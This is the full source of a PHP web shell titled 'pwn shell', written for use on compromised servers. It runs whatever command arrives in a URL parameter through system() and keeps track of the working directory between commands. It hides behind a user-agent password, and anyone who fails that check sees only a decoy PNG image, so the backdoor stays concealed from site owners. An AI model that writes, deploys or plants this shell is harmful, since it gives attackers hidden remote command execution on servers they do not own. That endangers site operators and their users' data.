<?PHP
$starttime = explode(' ', microtime());
$starttime = $starttime[1] + $starttime[0];

/*
Name:   pwn.php
Desc:   PHP shell for pwning
Rev:    0.1
Date:   06/08/10
Features:
        Stealth feature password protected via user agent.
        Tracks pwd between commands.
*/
$open = 0; //1 - Open access, 0 - Password protected via user agent.
$password="secret"; //If open=0 user agent must =$password
$img="iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAIAAAAlC+aJAAAAAXNSR0IArs4c6QAAAAlwSFlzAAAL
EwAACxMBAJqcGAAAAAd0SU1FB9oIAgEPAo1cAXcAAAAZdEVYdENvbW1lbnQAQ3JlYXRlZCB3aXRo
IEdJTVBXgQ4XAAAAIklEQVRo3u3BAQ0AAADCoPdPbQ8HFAAAAAAAAAAAAAAA8G4wQAABEp2S+AAA
AABJRU5ErkJggg==";
$cmd=$_GET['cmd'];
$pwd=$_GET['pwd'];
$file=$_SERVER["SCRIPT_NAME"];
$file=basename($file);

if($cmd=='') $cmd='id;echo;w'; //The default command.

if($_SERVER['HTTP_USER_AGENT'] == $password || $open){
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>Wolf's shell</title>
<style>
body{
        background-color: #000000;
        color: #FFFFFF;
        font-size:0.5em;
}
#main{
        width: 700px;
        margin: auto;
}
#output{
        height: 500px;
        overflow: auto;
        background-color: #111111;
        -moz-border-radius: 10px;
        -webkit-border-radius: 10px;
        padding: 10px;
        font-size: 2em;
}
#banner{
        -moz-border-radius: 10px;
        -webkit-border-radius: 10px;
        padding: 5px;
        text-align: center;
        background-color: #0D0D0D;
        color: #00AA00;
        font-weight: bolder;
        font-size: 5em;
        font-family: "Courier New";
        font-variant: small-caps;
}
#footer{
        -moz-border-radius: 10px;
        -webkit-border-radius: 10px;
        padding: 5px;
        text-align: center;
        background-color: #0D0D0D;
        color: #191919;
        font-size: 1.5em;
}
input{
        background-color: #000000;
        color: #FFFFFF;
}
</style>
</head>
<body>
<div id="main">
<div id="banner">
pwn shell
</div>
<br/>
<div id='output'><font color="green">
<?PHP
$user=system("whoami");
echo "@$file</font><font color=white>:</font><font color=blue>$pwd</font>";
if($user=="root"){ echo "#";}else{echo "$";}
echo " $cmd<pre>";
$pwd=system("cd $pwd;$cmd;pwd",$ret);
?>
</pre>
</div>
<br/>
<form action="" method="get">
<input type="text" name="cmd" size="74"/>
<input type="hidden" name="pwd" value="<?PHP echo $pwd;?>"/>
<input type="submit" value="Execute"/>
</form>
<br/>
<div id="footer">
<?PHP
$mtime = explode(' ', microtime());
$totaltime = $mtime[0] + $mtime[1] - $starttime;
printf('Command returned in %.3f seconds.', $totaltime);
?>
</div>
</div>
</body>
</html>
<?PHP
}else{
//If auth failed ouput:
header("Content-type: image/png");
echo base64_decode($img);
//This can be reaplaced with whatever.
//header("Location: index.php");
}
?>
